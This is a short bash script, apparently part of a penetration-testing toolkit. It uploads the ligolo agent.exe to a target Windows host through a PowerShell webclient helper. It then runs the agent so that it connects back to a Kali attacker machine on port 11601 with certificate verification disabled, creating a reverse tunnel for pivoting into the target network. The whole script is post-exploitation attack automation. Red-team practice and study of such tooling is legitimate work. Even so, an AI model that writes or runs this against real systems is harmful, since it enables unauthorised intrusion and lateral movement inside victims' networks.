#!/bin/bash

: '
ps download ligolo agent.exe to server and connect to proxy
'

LOCATION="${SCRIPTS_DIR}/portListening/ligolo/.files"
FILE="agent.exe"

ps_webclient_upload_file "${LOCATION}" "${FILE}"
sleep 3

execute_command "${FILE_LOCATION} -connect ${KALI_IP}:11601 -ignore-cert"
create_new_line
